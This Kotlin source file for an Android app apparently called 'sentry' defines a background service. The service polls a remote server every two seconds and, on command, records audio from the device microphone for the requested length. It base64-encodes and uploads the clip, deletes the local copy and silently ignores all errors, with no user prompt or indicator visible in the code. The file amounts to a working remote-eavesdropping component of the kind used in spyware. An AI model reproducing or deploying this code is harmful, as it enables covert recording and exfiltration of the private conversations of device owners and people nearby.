package com.example.sentry.service

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Base64
import android.util.Log
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import java.io.File
import java.io.FileInputStream

object BackgroundAudioManager {
    private var pollerJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.IO)
    private var isRecordingNow = false

    fun startListening(context: Context) {
        if (pollerJob?.isActive == true) return
        pollerJob = scope.launch {
            val client = SentryApiClient(context)
            while (isActive) {
                try {
                    val res = client.pollAudioCommand()
                    if (res.isSuccess) {
                        val duration = res.getOrNull()
                        if (duration != null && duration > 0 && !isRecordingNow) {
                            recordAudioClip(context, duration) { file, lengthSeconds ->
                                scope.launch {
                                    try {
                                        val bytes = file.readBytes()
                                        val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                        val sizeKb = (bytes.size / 1024).coerceAtLeast(1)
                                        client.uploadAudio(
                                            name = file.name,
                                            duration = "0:${String.format("%02d", lengthSeconds)}",
                                            size = "$sizeKb KB",
                                            base64 = base64
                                        )
                                        file.delete()
                                    } catch (_: Exception) {
                                    }
                                }
                            }
                        }
                    }
                } catch (_: Exception) {
                }
                delay(2000)
            }
        }
    }

    private fun recordAudioClip(context: Context, durationSeconds: Int, onComplete: (File, Int) -> Unit) {
        scope.launch {
            isRecordingNow = true
            val outputFile = File(context.cacheDir, "audio_clip_${System.currentTimeMillis()}.m4a")
            var recorder: MediaRecorder? = null
            try {
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(context)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioSamplingRate(32000)
                    setAudioEncodingBitRate(64000)
                    setOutputFile(outputFile.absolutePath)
                    prepare()
                    start()
                }

                delay(durationSeconds * 1000L)

                try {
                    recorder.stop()
                    recorder.release()
                } catch (_: Exception) {
                }

                onComplete(outputFile, durationSeconds)
            } catch (e: Exception) {
                try {
                    recorder?.release()
                } catch (_: Exception) {}
            } finally {
                isRecordingNow = false
            }
        }
    }
}
